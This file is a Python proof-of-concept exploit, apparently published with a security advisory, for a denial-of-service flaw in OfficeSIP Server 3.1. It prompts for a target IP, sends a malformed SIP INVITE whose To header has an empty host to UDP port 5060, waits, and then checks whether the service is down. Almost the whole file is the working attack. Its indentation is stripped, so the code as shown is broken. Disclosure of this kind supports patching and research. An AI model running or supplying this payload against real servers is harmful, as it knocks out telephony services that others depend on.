
#!/usr/bin/python
##############################################################################
#
# Title    : OfficeSIP Server Denial Of Service Vulnerability
# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
# Vendor   : http://www.officesip.com
# Advisory : http://secpod.org/blog/?p=461
#            http://secpod.org/advisories/SecPod_Exploit_OfficeSIP_Server_DOS_Vuln.txt
#            http://secpod.org/exploits/SecPod_Exploit_OfficeSIP_Server_DOS.py
# Software : OfficeSIP Server 3.1
# Date     : 01/02/2012
#
##############################################################################
import socket,sys,time
port   = 5060
target = raw_input("Enter host/target ip address: ")
if not target:
print "Host/Target IP Address is not specified"
sys.exit(1)
print "you entered ", target
try:
socket.inet_aton(target)
except socket.error:
print "Invalid IP address found ..."
sys.exit(1)
try:
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
print "socket() failed service not running"
sys.exit(1)
#Malicous To SIP URI triggers vulnerability and brings SIP port down
exploit = "INVITE sip:test@officesip.local SIP/2.0\r\n"+\
"Via: SIP/2.0/UDP example.com\r\n"+\
"To: user2 <sip:malicioususer@>\r\n"+\
"From: user1 <sip:user1@server1.com>;tag=00\r\n"+\
"Call-ID: test@server.com\r\n"+\
"CSeq: 1 INVITE\r\n"+\
"Contact: <sip:user1@server1.com>\r\n\r\n"
sock.sendto(exploit, (target, port))
#Server evaluates and takes a while to go down.
time.sleep(40)
sock.close()
#Verify port is down
try:
sock.connect()
except:
print "OfficeSIP server port is down."
print "Service not responding ...."
sys.exit(1)